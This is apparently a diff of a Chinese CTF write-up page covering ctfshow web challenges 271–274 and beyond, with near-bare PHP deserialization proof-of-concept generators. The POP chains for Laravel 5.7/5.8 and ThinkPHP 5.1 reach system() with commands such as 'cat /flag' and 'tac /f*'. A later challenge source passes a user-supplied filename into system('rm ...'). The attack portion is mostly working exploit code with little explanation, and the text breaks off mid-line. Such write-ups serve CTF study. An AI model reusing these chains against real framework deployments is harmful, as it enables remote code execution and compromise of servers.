-<p>​		Laravel 5.7 的反序列化漏洞，源码在这儿：<a target="_blank" rel="noopener" href="https://github.com/laravel/laravel/tree/5.7%E3%80%82">https://github.com/laravel/laravel/tree/5.7。</a></p>
+<p>​		Laravel 5.7 的反序列化漏洞，源码在这儿：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xhcmF2ZWwvbGFyYXZlbC90cmVlLzUuNyVFMyU4MCU4Mg==">https://github.com/laravel/laravel/tree/5.7。</span></p>
 <p>​		不大会开发，直接上 poc 算了：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters[]=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test=<span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app=<span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindings=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;concrete&#x27;</span>=&gt;<span class="string">&#x27;Illuminate\Foundation\Application&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingCommand</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h1 id="web272"><a class="markdownIt-Anchor" href="#web272">#</a> web272：</h1>
-<p>​		上一篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113835057">laravel5.8 反序列化漏洞复现</a></p>
+<p>​		上一篇文章：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlci9hcnRpY2xlL2RldGFpbHMvMTEzODM1MDU3">laravel5.8 反序列化漏洞复现</span></p>
 <p>​		直接上 poc：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:27:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:39:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">line</span> = <span class="title class_">new</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>\<span class="title class_">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php system(&#x27;tac /f*&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Console\QueuedCommand</span>(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h1 id="web273"><a class="markdownIt-Anchor" href="#web273">#</a> web273：</h1>
 <p>​		用这个 poc：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>=&quot;<span class="title class_">cat</span> /<span class="title class_">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>=&quot;<span class="title class_">system</span>&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h1 id="web274"><a class="markdownIt-Anchor" href="#web274">#</a> web274：</h1>
-<p>​		thinkphp 反序列化，贴个文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6619?time__1311=n4%2BxnD0Dg7%3D7wxWqGNnmDUxYqKQu5D5i5Q5pdx#toc-1">thinkphp5.1.x~5.2.x 版本反序列化链挖掘分析</a></p>
+<p>​		thinkphp 反序列化，贴个文章：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjYxOT90aW1lX18xMzExPW40JTJCeG5EMERnNyUzRDd3eFdxR05ubURVeFlxS1F1NUQ1aTVRNXBkeCN0b2MtMQ==">thinkphp5.1.x~5.2.x 版本反序列化链挖掘分析</span></p>
 <p>​		放个 poc：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>​		然后，将生成的 payload 放在下面的 payload 处：</p>
@@ -325,60 +318,377 @@ __invoke () // 当尝试以调用函数的方式调用一个对象时</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span 